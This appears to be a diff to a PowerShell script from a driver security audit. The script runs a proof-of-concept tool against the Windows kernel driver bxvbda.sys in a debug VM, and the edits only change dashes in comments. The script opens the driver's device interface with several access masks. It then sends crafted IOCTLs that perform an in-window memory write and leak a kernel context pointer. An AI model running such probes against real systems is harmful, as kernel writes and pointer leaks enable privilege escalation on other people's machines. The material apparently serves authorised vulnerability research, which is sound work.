@@ -1,4 +1,4 @@
-# t7 phase E: bxvbda.sys gate attempt — t1/t3-proven recipe (devnode FIRST, seed AFTER)
+# t7 phase E: bxvbda.sys gate attempt - t1/t3-proven recipe (devnode FIRST, seed AFTER)
 $ErrorActionPreference = 'Continue'
 $out = 'C:\Users\vmdebug\Desktop\t7_work\t7_bxv.txt'
 "t7_bxv $(Get-Date -Format o)" | Out-File $out -Encoding ascii
@@ -64,7 +64,7 @@ foreach ($acc in 'c0000000','120089','0') {
   & "$work\t7_poc.exe" $out open $ifp $acc 3
 }
 
-# 9. DACL if openable — controlled by rc: if open succeeded, the next lines run
+# 9. DACL if openable - controlled by rc: if open succeeded, the next lines run
 # (script logic: probe open via .NET first)
 Log "=== conditional deep step (only if open succeeded) ==="
 $h = $null
@@ -75,7 +75,7 @@ try {
 if ($h) {
   $h.Close()
   Log "--- interface OPENABLE: running SAFE probes (in-window write + ctx-ptr leak) ---"
-  # 0x80002024 SAFE in-window: {offset=0x7F00, count=1, data=0} — mission-approved probe
+  # 0x80002024 SAFE in-window: {offset=0x7F00, count=1, data=0} - mission-approved probe
   & "$work\t7_poc.exe" $out ioctl $ifp 80002024 10 40 007f00000100000000000000
   # 0x80002050 ctx-ptr leak (fixed-size getter per audit)
   & "$work\t7_poc.exe" $out ioctl $ifp 80002050 0 40
